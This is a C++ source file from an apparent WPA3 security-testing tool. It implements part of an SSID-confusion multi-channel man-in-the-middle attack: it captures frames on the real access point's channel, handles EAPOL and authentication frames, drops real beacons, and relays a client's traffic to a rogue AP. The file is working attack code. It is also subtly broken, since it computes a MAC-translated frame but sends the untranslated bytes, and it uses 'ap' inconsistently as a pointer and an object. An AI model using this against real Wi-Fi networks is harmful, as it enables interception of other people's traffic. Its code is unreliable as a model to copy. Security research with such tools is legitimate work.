#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;
using namespace std::chrono;

void SsidConfusion::send_to_rogue(PDU &pdu) const {
	const std::vector<uint8_t> raw = pdu.serialize();
	send_to_rogue(raw);
}

void SsidConfusion::send_to_rogue(const vector<uint8_t> &raw) const {
	auto translated = raw;
	translate_data_mac(translated, ap->get(SK::mac), rogue_ap->get(SK::mac));
	sock_rogue->send(raw, netconfig.rogue_channel);
}


void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const std::vector<uint8_t> &raw) {
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;
	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.real_channel))
			return;
	}
	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
		log(LogLevel::DEBUG, "Real channel: Unknown frame type");
		return;
	}

	power_mgmt_response_real(addr2, *dot11);


	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_eapol_real(addr1, addr2, *dot11))
	SOLVE_OR_CONTINUE(handle_auth_from_client_real(addr1, *dot11))

	#undef SOLVE_OR_CONTINUE

	if(dot11->find_pdu<Dot11Beacon>()) {
		last_real_beacon = steady_clock::now();
		return; // don't relay real AP beacons
	}

	if(addr1 == sta.get(SK::mac) || addr2 == ap.get(SK::mac)) {
		// This is traffic involving the real AP

		//translate_data_mac(translated, ap_bssid, rogue_ap_mac);

		display_traffic(*pdu, "Real channel", " -- MitM'ing");
		send_to_rogue(*pdu);
		return;
	}
}

}